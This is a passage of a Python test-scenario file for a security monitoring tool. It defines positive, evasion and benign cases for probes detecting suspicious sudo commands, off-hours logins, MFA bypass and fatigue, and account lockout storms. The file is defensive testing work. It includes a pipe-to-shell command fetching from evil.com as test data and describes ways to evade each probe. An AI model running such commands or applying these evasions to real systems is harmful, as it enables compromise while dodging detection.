        "Instead of one suspicious command, the attacker makes multiple innocuous "
        "sudo calls: first creates a file, then modifies it, then executes it. "
        "No single call triggers the pattern-matching rules."
    ),
    why=(
        "SudoSuspiciousCommandProbe checks each command string independently. "
        "Split commands ('sudo touch /tmp/x', 'sudo chmod +x /tmp/x', "
        "'sudo /tmp/x') each look benign in isolation. "
        "Multi-step attacks split across sudo calls evade pattern detection."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="SUDO_EXEC",
            status="SUCCESS",
            username="attacker",
            command="sudo touch /tmp/innocent",
        ),
        _ae(
            timestamp_ns=_T1,
            event_type="SUDO_EXEC",
            status="SUCCESS",
            username="attacker",
            command="sudo chmod +x /tmp/innocent",
        ),
        _ae(
            timestamp_ns=_T2,
            event_type="SUDO_EXEC",
            status="SUCCESS",
            username="attacker",
            command="sudo /tmp/innocent",
        ),
    ],
    expect_evades=True,
)

_SUSP_EVA3 = AdversarialCase(
    id="susp_evade_failed_sudo",
    title="Dangerous sudo command that fails (SUDO_DENIED) — probe only checks SUCCESS",
    category="evasion",
    description=(
        "The attacker attempts the dangerous command but is denied by sudoers "
        "policy. SudoSuspiciousCommandProbe only processes SUDO_EXEC events "
        "with status=SUCCESS. Failed attempts are handled by SudoElevationProbe "
        "as denied_attempt events."
    ),
    why=(
        "probe filters for event_type=='SUDO_EXEC' AND status=='SUCCESS'. "
        "SUDO_DENIED events → skipped. "
        "Dangerous intent + denied access = no suspicious_command event. "
        "The denial is caught by SudoElevationProbe (MEDIUM), not this probe."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="SUDO_DENIED",  # Denied — probe skips
            status="FAILURE",
            username="attacker",
            command="curl http://evil.com | sudo bash",
        )
    ],
    expect_evades=True,
)

_SUSP_BEN1 = AdversarialCase(
    id="susp_benign_apt_update",
    title="sudo apt update — legitimate package management, no fire",
    category="benign",
    description=(
        "System administrator runs `sudo apt update` — a completely routine "
        "operation. No pattern in the command matches the suspicious pattern set."
    ),
    why=(
        "Command 'sudo apt update' doesn't match any SUSPICIOUS_PATTERNS. "
        "No pipe-to-shell, no sudoers modification, no disk wipe, etc. "
        "Zero events emitted."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="SUDO_EXEC",
            status="SUCCESS",
            username="admin",
            command="sudo apt update",
        )
    ],
    expect_count=0,
    expect_evades=False,
)

_SUSP_BEN2 = AdversarialCase(
    id="susp_benign_systemctl",
    title="sudo systemctl restart nginx — routine service restart, no fire",
    category="benign",
    description=(
        "Routine service management: restarting nginx. "
        "No dangerous patterns present — this is normal operations."
    ),
    why=(
        "'sudo systemctl restart nginx' matches no suspicious patterns. "
        "Service management is a legitimate sudo use case."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="SUDO_EXEC",
            status="SUCCESS",
            username="ops",
            command="sudo systemctl restart nginx",
        )
    ],
    expect_count=0,
    expect_evades=False,
)

SUDO_SUSPICIOUS_COMMAND_SCENARIO: Scenario = register(
    Scenario(
        probe_id="sudo_suspicious_command",
        agent="auth",
        name="sudo_suspicious_command",
        title="Suspicious Sudo Command Execution (T1059 / T1548)",
        description=(
            "An attacker runs curl|sudo bash (CRITICAL), sudoers backdoor (CRITICAL), "
            "or sudo bash for a root shell (HIGH). "
            "Base64 obfuscation partially evades (HIGH not CRITICAL). "
            "Split commands and denied attempts evade entirely."
        ),
        mitre_techniques=["T1059", "T1059.004", "T1548", "T1548.003"],
        mitre_tactics=["Execution", "Privilege Escalation"],
        probe_factory=SudoSuspiciousCommandProbe,
        cases=[
            _SUSP_POS1,
            _SUSP_POS2,
            _SUSP_POS3,
            _SUSP_EVA1,
            _SUSP_EVA2,
            _SUSP_EVA3,
            _SUSP_BEN1,
            _SUSP_BEN2,
        ],
    )
)


# =============================================================================
# 5. OffHoursLoginProbe — after 8pm / before 6am / weekends
# =============================================================================
#
# NOTE: This probe uses datetime.fromtimestamp() which converts to LOCAL time.
# _T_NIGHT   = 2023-11-15 08:00 UTC = midnight PST / 3am EST (off-hours in US)
# _T_WEEKEND = 2023-11-18 08:00 UTC = Saturday midnight PST (weekend off-hours)
# _T0        = 2023-11-14 22:13 UTC = 2pm PST / 5pm EST (business hours)
#
# Tests run on macOS in US timezone — if running in UTC or other zones,
# adjust _T_NIGHT and _T_WEEKEND accordingly.

_OFFHOURS_POS1 = AdversarialCase(
    id="offhours_midnight_pst",
    title="SSH login at midnight PST (8am UTC) → MEDIUM",
    category="positive",
    description=(
        "Attacker accesses the server at midnight PST — clearly outside business hours. "
        "Unusual login times are a strong indicator of unauthorized access or "
        "a compromised account being used when the legitimate user is asleep."
    ),
    why=(
        "timestamp_ns → local time midnight (hour=0) → hour < 6 → off_hours_login MEDIUM. "
        "Any login where local_hour >= 20 OR local_hour < 6 fires."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T_NIGHT,
            event_type="SSH_LOGIN",
            status="SUCCESS",
            username="victim",
            source_ip="1.2.3.4",
        )
    ],
    expect_count=1,
    expect_event_types=["off_hours_login"],
    expect_severity=Severity.MEDIUM,
)

_OFFHOURS_POS2 = AdversarialCase(
    id="offhours_weekend_night",
    title="SSH login Saturday midnight PST → MEDIUM (weekend + night)",
    category="positive",
    description=(
        "Attacker logs in Saturday midnight — both a weekend and nighttime. "
        "Weekend logins are flagged regardless of hour. "
        "Combined indicators (weekend + midnight) increase suspicion."
    ),
    why=(
        "timestamp_ns → Saturday (weekday==5) → off_hours_login MEDIUM. "
        "Weekend logins fire regardless of hour (weekday >= 5 → off hours)."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T_WEEKEND,
            event_type="SSH_LOGIN",
            status="SUCCESS",
            username="attacker",
            source_ip="185.220.0.1",
        )
    ],
    expect_count=1,
    expect_event_types=["off_hours_login"],
    expect_severity=Severity.MEDIUM,
)

_OFFHOURS_POS3 = AdversarialCase(
    id="offhours_local_login_night",
    title="LOCAL_LOGIN at off-hours → MEDIUM",
    category="positive",
    description=(
        "An attacker with physical access logs in locally at night. "
        "OffHoursLoginProbe also watches LOCAL_LOGIN events — "
        "physical console access at midnight is equally suspicious."
    ),
    why=(
        "event_type=LOCAL_LOGIN + status=SUCCESS + off-hours timestamp → "
        "off_hours_login MEDIUM. Probe monitors both SSH and console access."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T_NIGHT,
            event_type="LOCAL_LOGIN",
            status="SUCCESS",
            username="insider",
            source_ip="",
        )
    ],
    expect_count=1,
    expect_event_types=["off_hours_login"],
    expect_severity=Severity.MEDIUM,
)

_OFFHOURS_EVA1 = AdversarialCase(
    id="offhours_evade_failure",
    title="Failed SSH login at off-hours — probe only watches SUCCESS",
    category="evasion",
    description=(
        "The attacker's login attempt at midnight fails (wrong password). "
        "OffHoursLoginProbe only processes successful logins. "
        "Failed off-hours attempts are a detection gap."
    ),
    why=(
        "probe filters for status=='SUCCESS'. "
        "status='FAILURE' → event skipped → no off_hours_login event. "
        "Failed attacks at suspicious hours are undetected by this probe."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T_NIGHT,
            event_type="SSH_LOGIN",
            status="FAILURE",  # Failed login
            username="attacker",
        )
    ],
    expect_evades=True,
)

_OFFHOURS_EVA2 = AdversarialCase(
    id="offhours_evade_business_hours",
    title="Login during business hours (2pm PST / 5pm EST) — no fire",
    category="evasion",
    description=(
        "Attacker operates during normal business hours to blend in with "
        "legitimate user activity. At 2pm PST (22:13 UTC), the login is "
        "within business hours and doesn't trigger the off-hours probe."
    ),
    why=(
        "_T0 → 2pm PST (hour=14). 6 <= 14 < 20 → business hours. "
        "Probe does not fire. Daytime attacker operations are invisible to "
        "time-based detection."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="SSH_LOGIN",
            status="SUCCESS",
            username="attacker",
        )
    ],
    expect_evades=True,
)

_OFFHOURS_EVA3 = AdversarialCase(
    id="offhours_evade_on_call",
    title="On-call engineer logs in at 2am — legitimate off-hours access",
    category="evasion",
    description=(
        "An on-call engineer responds to a production incident at 2am. "
        "The probe fires MEDIUM on legitimate on-call access — a known FP "
        "that trains operators to ignore off-hours alerts. "
        "This reduces the signal-to-noise ratio for real attacker activity."
    ),
    why=(
        "EVADES as FP: OffHoursLoginProbe cannot distinguish on-call engineers "
        "from attackers. No allowlist for known on-call users or scheduled "
        "maintenance windows. Alert fatigue from legitimate off-hours logins "
        "desensitizes security teams."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T_NIGHT,
            event_type="SSH_LOGIN",
            status="SUCCESS",
            username="oncall_engineer",
        )
    ],
    # Fires MEDIUM — documented FP (on-call access indistinguishable from attack)
    expect_evades=False,
    expect_count=1,
    expect_event_types=["off_hours_login"],
)

_OFFHOURS_BEN1 = AdversarialCase(
    id="offhours_benign_business",
    title="Login at 2pm PST (business hours) — no fire",
    category="benign",
    description=(
        "Normal developer SSH login during the workday. "
        "2pm PST is within business hours — probe correctly ignores."
    ),
    why=(
        "_T0 = 14:13 PST. hour=14 → 6 <= 14 < 20 → business hours. "
        "Probe skips. No false positive on normal work activity."
    ),
    shared_data_key="auth_events",
    events=[_ae(timestamp_ns=_T0, event_type="SSH_LOGIN", status="SUCCESS")],
    expect_count=0,
    expect_evades=False,
)

_OFFHOURS_BEN2 = AdversarialCase(
    id="offhours_benign_vpn_login",
    title="VPN_LOGIN event — probe watches SSH and LOCAL, not VPN",
    category="benign",
    description=(
        "A VPN login event. OffHoursLoginProbe filters for SSH_LOGIN and "
        "LOCAL_LOGIN only. VPN_LOGIN is handled by MFABypassOrAnomalyProbe."
    ),
    why=(
        "event_type='VPN_LOGIN' ∉ {SSH_LOGIN, LOCAL_LOGIN} → probe skips. "
        "VPN logins at off-hours don't fire this probe."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T_NIGHT,
            event_type="VPN_LOGIN",
            status="SUCCESS",
        )
    ],
    expect_count=0,
    expect_evades=False,
)

OFF_HOURS_LOGIN_SCENARIO: Scenario = register(
    Scenario(
        probe_id="off_hours_login",
        agent="auth",
        name="off_hours_login",
        title="Off-Hours SSH / Console Login (T1078)",
        description=(
            "SSH and local logins outside 6am-8pm on weekdays, or any time on "
            "weekends, fire MEDIUM alerts. "
            "Note: Probe uses local timezone — test results vary by system TZ. "
            "Failed logins and business-hours attacker activity evade. "
            "On-call engineers cause FPs."
        ),
        mitre_techniques=["T1078"],
        mitre_tactics=["Initial Access", "Persistence"],
        probe_factory=OffHoursLoginProbe,
        cases=[
            _OFFHOURS_POS1,
            _OFFHOURS_POS2,
            _OFFHOURS_POS3,
            _OFFHOURS_EVA1,
            _OFFHOURS_EVA2,
            _OFFHOURS_EVA3,
            _OFFHOURS_BEN1,
            _OFFHOURS_BEN2,
        ],
    )
)


# =============================================================================
# 6. MFABypassOrAnomalyProbe — login without MFA, fatigue attack
# =============================================================================

_MFA_POS1 = AdversarialCase(
    id="mfa_bypass_ssh_no_mfa",
    title="SSH_LOGIN success without MFA_SUCCESS → CRITICAL (mfa_bypass_suspected)",
    category="positive",
    description=(
        "An attacker uses stolen session credentials or bypasses MFA via a "
        "session fixation attack. The SSH login succeeds but no corresponding "
        "MFA_SUCCESS event is present — the user 'authenticated' without MFA."
    ),
    why=(
        "probe tracks mfa_successes set and login_events. "
        "SSH_LOGIN success for 'victim' exists but 'victim' ∉ mfa_successes. "
        "→ mfa_bypass_suspected CRITICAL."
    ),
    shared_data_key="auth_events",
    events=[
        # SSH login succeeds, but no MFA_SUCCESS event
        _ae(
            timestamp_ns=_T1,
            event_type="SSH_LOGIN",
            status="SUCCESS",
            username="victim",
        )
    ],
    expect_count=1,
    expect_event_types=["mfa_bypass_suspected"],
    expect_severity=Severity.CRITICAL,
)

_MFA_POS2 = AdversarialCase(
    id="mfa_fatigue_10_challenges",
    title="10 MFA challenges before success — fatigue attack → HIGH",
    category="positive",
    description=(
        "Attacker bombards the victim with 10 MFA push notifications. "
        "The victim, confused or fatigued, approves one. The attacker now has "
        "legitimate session credentials. This is MFA fatigue / push spam attack."
    ),
    why=(
        "MFA_CHALLENGE events for 'victim': count=10 >= MFA_FATIGUE_THRESHOLD(10). "
        "AND victim ∈ mfa_successes (they did eventually approve). "
        "→ mfa_fatigue_attack HIGH."
    ),
    shared_data_key="auth_events",
    events=(
        # 10 MFA challenge events
        [
            _ae(
                timestamp_ns=_T0 + int(i * 30 * 1e9),
                event_type="MFA_CHALLENGE",
                status="PENDING",
                username="victim",
            )
            for i in range(10)
        ]
        + [
            # One MFA success (victim approved on the 10th push)
            _ae(
                timestamp_ns=_T0 + int(310 * 1e9),
                event_type="MFA_SUCCESS",
                status="SUCCESS",
                username="victim",
            ),
        ]
    ),
    expect_count=1,
    expect_event_types=["mfa_fatigue_attack"],
    expect_severity=Severity.HIGH,
)

_MFA_POS3 = AdversarialCase(
    id="mfa_bypass_vpn_no_mfa",
    title="VPN_LOGIN success without MFA_SUCCESS → CRITICAL",
    category="positive",
    description=(
        "Attacker gains VPN access using stolen credentials without MFA. "
        "VPN is a critical access point — bypassing MFA on VPN gives full "
        "network access to internal resources."
    ),
    why=(
        "VPN_LOGIN success for 'sysadmin' without MFA_SUCCESS for 'sysadmin'. "
        "→ mfa_bypass_suspected CRITICAL."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="VPN_LOGIN",
            status="SUCCESS",
            username="sysadmin",
        )
    ],
    expect_count=1,
    expect_event_types=["mfa_bypass_suspected"],
    expect_severity=Severity.CRITICAL,
)

_MFA_EVA1 = AdversarialCase(
    id="mfa_evade_no_mfa_events",
    title="No MFA events in the system — probe can't detect bypass",
    category="evasion",
    description=(
        "The organization doesn't have MFA deployed (or MFA events aren't "
        "being collected). Without MFA_CHALLENGE and MFA_SUCCESS events, "
        "the probe has no baseline to compare against. "
        "All logins look like 'bypasses' — but firing on all of them would "
        "be 100% FP rate. The probe likely requires MFA infrastructure."
    ),
    why=(
        "If the organization has no MFA events at all, the probe fires "
        "mfa_bypass_suspected on every login — constant critical alerts. "
        "In practice this means the probe only works in MFA-enabled environments. "
        "Attackers targeting non-MFA environments evade by design."
    ),
    shared_data_key="auth_events",
    events=[
        # SSH login with no MFA infrastructure → fires CRITICAL (mfa_bypass_suspected)
        # This is technically caught but generates FP in non-MFA environments
        _ae(
            timestamp_ns=_T0,
            event_type="SSH_LOGIN",
            status="SUCCESS",
            username="normaluser",
        )
    ],
    # Fires CRITICAL (bypass detected) — but it's a FP if MFA isn't deployed
    expect_evades=False,
    expect_count=1,
    expect_event_types=["mfa_bypass_suspected"],
)

_MFA_EVA2 = AdversarialCase(
    id="mfa_evade_session_hijack",
    title="Session token theft — no new login, no MFA challenge",
    category="evasion",
    description=(
        "Attacker steals an active session token (via XSS, memory scraping, "
        "or network sniffing) and uses it directly without authenticating. "
        "No SSH_LOGIN or VPN_LOGIN event is generated — the existing session "
        "is reused. Neither MFA bypass nor fatigue is triggered."
    ),
    why=(
        "probe only fires on SSH_LOGIN and VPN_LOGIN events. "
        "Session token reuse doesn't generate new auth events → "
        "probe sees nothing → CRITICAL bypass goes undetected. "
        "Post-authentication attacks evade authentication-layer probes."
    ),
    shared_data_key="auth_events",
    events=[
        # Only a MFA_CHALLENGE from the legitimate user's original auth
        _ae(
            timestamp_ns=_T0,
            event_type="MFA_CHALLENGE",
            status="PENDING",
            username="victim",
        )
    ],
    expect_evades=True,
)

_MFA_EVA3 = AdversarialCase(
    id="mfa_evade_approved_token",
    title="Attacker reuses approved MFA token from phishing — logged as MFA_SUCCESS",
    category="evasion",
    description=(
        "Real-time phishing: attacker's fake login page captures the victim's "
        "OTP and immediately replays it to the real server. The victim's MFA "
        "approval is proxied to the attacker's session. "
        "The system sees a valid MFA_SUCCESS → no bypass suspected."
    ),
    why=(
        "probe sees: MFA_SUCCESS (proxied), SSH_LOGIN success. "
        "victim ∈ mfa_successes → no mfa_bypass_suspected. "
        "MFA challenge count = 1 < FATIGUE_THRESHOLD(10) → no fatigue. "
        "Real-time phishing proxy is undetectable by MFA event analysis alone."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="MFA_CHALLENGE",
            status="PENDING",
            username="victim",
        ),
        _ae(
            timestamp_ns=_T1,
            event_type="MFA_SUCCESS",
            status="SUCCESS",
            username="victim",
        ),
        _ae(
            timestamp_ns=_T2,
            event_type="SSH_LOGIN",
            status="SUCCESS",
            username="victim",
        ),
    ],
    expect_evades=True,
)

_MFA_BEN1 = AdversarialCase(
    id="mfa_benign_normal_login",
    title="MFA challenge → MFA success → SSH login — normal auth flow",
    category="benign",
    description=(
        "Legitimate user authenticates normally: MFA push challenge sent, "
        "user approves, SSH login succeeds. This is the expected auth flow. "
        "No bypass, no fatigue."
    ),
    why=(
        "MFA_CHALLENGE count=1 < FATIGUE_THRESHOLD(10). "
        "victim ∈ mfa_successes AND SSH_LOGIN success → no mfa_bypass_suspected. "
        "Healthy auth flow generates no events."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="MFA_CHALLENGE",
            status="PENDING",
            username="alice",
        ),
        _ae(
            timestamp_ns=_T1,
            event_type="MFA_SUCCESS",
            status="SUCCESS",
            username="alice",
        ),
        _ae(
            timestamp_ns=_T2, event_type="SSH_LOGIN", status="SUCCESS", username="alice"
        ),
    ],
    expect_count=0,
    expect_evades=False,
)

_MFA_BEN2 = AdversarialCase(
    id="mfa_benign_no_login",
    title="Only MFA_CHALLENGE events, no login — probe doesn't fire",
    category="benign",
    description=(
        "User receives MFA push but doesn't complete the login "
        "(maybe closed their laptop). No SSH_LOGIN or VPN_LOGIN event. "
        "The probe requires a completed login to detect bypass."
    ),
    why=(
        "No SSH_LOGIN or VPN_LOGIN events → no login event to check for MFA. "
        "probe doesn't flag pending challenges without corresponding logins. "
        "Incomplete auth flows don't trigger either bypass or fatigue."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="MFA_CHALLENGE",
            status="PENDING",
            username="bob",
        ),
    ],
    expect_count=0,
    expect_evades=False,
)

MFA_BYPASS_ANOMALY_SCENARIO: Scenario = register(
    Scenario(
        probe_id="mfa_bypass_anomaly",
        agent="auth",
        name="mfa_bypass_anomaly",
        title="MFA Bypass and Fatigue Attack (T1621 / T1078)",
        description=(
            "An attacker logs in without MFA (CRITICAL) or performs MFA fatigue "
            "with 10+ push notifications (HIGH). "
            "Gaps: real-time OTP phishing proxies produce valid MFA_SUCCESS events; "
            "session hijacking bypasses auth layer entirely; "
            "non-MFA environments trigger constant FPs."
        ),
        mitre_techniques=["T1621", "T1078"],
        mitre_tactics=["Credential Access", "Initial Access"],
        probe_factory=MFABypassOrAnomalyProbe,
        cases=[
            _MFA_POS1,
            _MFA_POS2,
            _MFA_POS3,
            _MFA_EVA1,
            _MFA_EVA2,
            _MFA_EVA3,
            _MFA_BEN1,
            _MFA_BEN2,
        ],
    )
)


# =============================================================================
# 7. AccountLockoutStormProbe — 5+ distinct accounts locked
# =============================================================================


def _lockout_events(usernames: list, source_ip: str = "10.0.0.1") -> list:
    """Generate one ACCOUNT_LOCKED event per username."""
    return [
        _ae(
            timestamp_ns=_T0 + int(i * 5 * 1e9),
            event_type="ACCOUNT_LOCKED",
            status="LOCKED",
            username=u,
            source_ip=source_ip,
        )
        for i, u in enumerate(usernames)
    ]


_LOCKOUT_POS1 = AdversarialCase(
    id="lockout_storm_5_accounts",
    title="5 accounts from same IP → 2 events (lockout_storm + lockout_storm_source)",
    category="positive",
    description=(
        "Attacker triggers lockout on 5 accounts by exceeding failed login "
        "attempts, all from IP 10.1.1.1. This mass lockout is a side effect of "
        "credential spraying or brute force that ignores lockout policies."
    ),
    why=(
        "len(locked_accounts)==5 >= LOCKOUT_STORM_THRESHOLD(5) → "
        "account_lockout_storm HIGH. Simultaneously, IP '10.1.1.1' has "
        "5 lockouts >= 3 (per-IP threshold) → lockout_storm_source HIGH. "
        "Both checks run independently → 2 events from the same incident."
    ),
    shared_data_key="auth_events",
    events=_lockout_events(
        ["alice", "bob", "charlie", "dave", "eve"],
        source_ip="10.1.1.1",
    ),
    expect_count=2,
    expect_event_types=["account_lockout_storm", "lockout_storm_source"],
    expect_severity=Severity.HIGH,
)

_LOCKOUT_POS2 = AdversarialCase(
    id="lockout_single_ip_3_accounts",
    title="Single IP locks 3 accounts → HIGH (lockout_storm_source)",
    category="positive",
    description=(
        "One source IP causes 3 distinct account lockouts. "
        "Even below the system-wide storm threshold, a single IP causing "
        "multiple lockouts is a strong signal of targeted credential attack."
    ),
    why=(
        "IP '10.2.2.2' has accounts_locked_by_ip count=3 >= 3 (per-IP threshold). "
        "→ lockout_storm_source HIGH. Per-IP threshold catches targeted attacks "
        "even when only a few accounts are affected."
    ),
    shared_data_key="auth_events",
    events=_lockout_events(
        ["sysadmin", "devops", "root"],
        source_ip="10.2.2.2",
    ),
    expect_count=1,
    expect_event_types=["lockout_storm_source"],
    expect_severity=Severity.HIGH,
)

_LOCKOUT_POS3 = AdversarialCase(
    id="lockout_storm_and_source",
    title="8 accounts locked + single-IP storm → 2 events (storm + source)",
    category="positive",
    description=(
        "Large-scale attack: 8 accounts locked, all from the same IP. "
        "Both the system-wide storm (>= 5 accounts) AND the per-IP threshold "
        "(>= 3 per IP) are met simultaneously."
    ),
    why=(
        "locked_accounts: 8 >= LOCKOUT_STORM_THRESHOLD(5) → account_lockout_storm HIGH. "
        "IP '172.16.1.1' locked 8 accounts >= 3 → lockout_storm_source HIGH. "
        "Two independent events from the same incident."
    ),
    shared_data_key="auth_events",
    events=_lockout_events(
        [f"user{i}" for i in range(8)],
        source_ip="172.16.1.1",
    ),
    expect_count=2,
    expect_event_types=["account_lockout_storm", "lockout_storm_source"],
    expect_severity=Severity.HIGH,
)

_LOCKOUT_EVA1 = AdversarialCase(
    id="lockout_evade_no_lockout_policy",
    title="No account lockout policy configured — lockouts never occur",
    category="evasion",
    description=(
        "If the target organization has no account lockout policy, brute force "
        "and spray attacks can run indefinitely without triggering ACCOUNT_LOCKED "
        "events. The attacker can enumerate passwords for as long as needed. "
        "The probe depends entirely on the OS generating lockout events."
    ),
    why=(
        "No ACCOUNT_LOCKED events → no locked_accounts accumulated → "
        "lockout_storm_threshold never reached. Attackers targeting "
        "systems without lockout policies are undetectable by this probe."
    ),
    shared_data_key="auth_events",
    events=[
        # Many failures but no lockout events
        _ae(
            timestamp_ns=_T0 + int(i * 2 * 1e9),
            event_type="SSH_LOGIN",
            status="FAILURE",
            username=f"user{i}",
        )
        for i in range(20)
    ],
    expect_evades=True,
)

_LOCKOUT_EVA2 = AdversarialCase(
    id="lockout_evade_4_accounts",
    title="4 accounts locked from one IP — just under system threshold",
    category="evasion",
    description=(
        "Attacker locks exactly 4 accounts across multiple IPs — one below the "
        "lockout storm threshold (5). And each IP causes < 3 lockouts, "
        "staying below the per-IP threshold. Calibrated to avoid both detections."
    ),
    why=(
        "4 total lockouts < LOCKOUT_STORM_THRESHOLD(5). "
        "2 lockouts per IP < per-IP threshold(3). "
        "Attacker limits lockout rate to stay below both thresholds."
    ),
    shared_data_key="auth_events",
    events=(
        _lockout_events(["a1", "a2"], source_ip="10.10.1.1")
        + _lockout_events(["b1", "b2"], source_ip="10.10.1.2")
    ),
    expect_evades=True,
)

_LOCKOUT_EVA3 = AdversarialCase(
    id="lockout_evade_distributed_ips",
    title="5 accounts locked from 5 different IPs (1 per IP) — per-IP threshold evades",
    category="evasion",
    description=(
        "Total 5 lockouts → system-wide storm threshold is met → fires storm. "
        "BUT each IP causes only 1 lockout → per-IP threshold (3) not met. "
        "This documents that per-IP detection is evadable with multiple IPs."
    ),
    why=(
        "5 total lockouts >= LOCKOUT_STORM_THRESHOLD → account_lockout_storm fires. "
        "Each IP: 1 lockout < 3 per-IP threshold → no lockout_storm_source. "
        "Distributed IPs evade the per-source attribution."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0 + int(i * 5 * 1e9),
            event_type="ACCOUNT_LOCKED",
            status="LOCKED",
            username=f"victim{i}",
            source_ip=f"10.99.1.{i + 1}",
        )
        for i in range(5)
    ],
    # account_lockout_storm fires (5 total) but NOT lockout_storm_source (1/IP)
    expect_count=1,
    expect_event_types=["account_lockout_storm"],
    expect_evades=False,
)

_LOCKOUT_BEN1 = AdversarialCase(
    id="lockout_benign_few",
    title="2 accounts locked — below threshold, no fire",
    category="benign",
    description=(
        "Two users forgot their passwords and got locked out — normal office "
        "occurrence. Below both the storm threshold (5) and per-IP threshold (3). "
        "No alarm."
    ),
    why=(
        "2 < LOCKOUT_STORM_THRESHOLD(5). 2 < per-IP threshold(3). "
        "Routine password-forgotten lockouts don't alarm."
    ),
    shared_data_key="auth_events",
    events=_lockout_events(["alice", "bob"], source_ip="10.1.1.1"),
    expect_count=0,
    expect_evades=False,
)

_LOCKOUT_BEN2 = AdversarialCase(
    id="lockout_benign_ssh_failures",
    title="SSH login failures (not ACCOUNT_LOCKED) — probe ignores",
    category="benign",
    description=(
        "Multiple SSH login failures from the same IP. "
        "AccountLockoutStormProbe only processes ACCOUNT_LOCKED events. "
        "Plain failures (before lockout) are not in scope."
    ),
    why=(
        "probe filters for event_type=='ACCOUNT_LOCKED'. "
        "SSH_LOGIN FAILURE events are ignored → 0 lockouts accumulated → "
        "no storm detection."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0 + int(i * 2 * 1e9),
            event_type="SSH_LOGIN",
            status="FAILURE",
            username=f"user{i}",
        )
        for i in range(10)
    ],
    expect_count=0,
    expect_evades=False,
)

ACCOUNT_LOCKOUT_STORM_SCENARIO: Scenario = register(
    Scenario(
        probe_id="account_lockout_storm",
        agent="auth",
        name="account_lockout_storm",
        title="Account Lockout Storm — Mass Brute Force (T1110)",
        description=(
            "Attackers trigger 5+ account lockouts (HIGH storm) or lock 3+ accounts "
            "from one IP (HIGH per-source). Evasions: no lockout policy deployed, "
            "staying at 4 accounts, distributing across 5 IPs (1 lockout each). "
            "Normal 2-account lockouts don't alarm."
        ),
        mitre_techniques=["T1110"],
        mitre_tactics=["Credential Access"],
        probe_factory=AccountLockoutStormProbe,
        cases=[
            _LOCKOUT_POS1,
            _LOCKOUT_POS2,
            _LOCKOUT_POS3,
            _LOCKOUT_EVA1,
            _LOCKOUT_EVA2,
            _LOCKOUT_EVA3,
            _LOCKOUT_BEN1,
            _LOCKOUT_BEN2,
        ],
    )
)
